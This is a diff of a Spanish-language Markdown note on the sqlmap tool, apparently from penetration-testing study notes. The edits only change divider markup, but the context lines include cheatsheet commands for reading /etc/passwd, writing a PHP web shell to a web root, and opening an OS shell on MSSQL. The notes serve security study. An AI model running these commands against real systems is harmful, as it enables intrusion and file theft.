@@ -19,7 +19,7 @@ linked:
 ---
 # sqlmap
 
-***
+---
 
 ## Cheatsheet
 ^sqlmap-cheatsheet
@@ -40,7 +40,7 @@ linked:
 | **File read** | `sqlmap -u URL --file-read=/etc/passwd` |
 | **File write** | `sqlmap -u URL --file-write=shell.php --file-dest=/var/www/html/s.php` |
 
-***
+---
 
 ## Flags esenciales
 
@@ -274,4 +274,4 @@ sqlmap -u URL --technique=S --os-shell --os=windows --dbms=mssql
 - [HackTricks - SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
 - [[SQL Injection (SQLi)]] — hub conceptual.
 
-***
+---
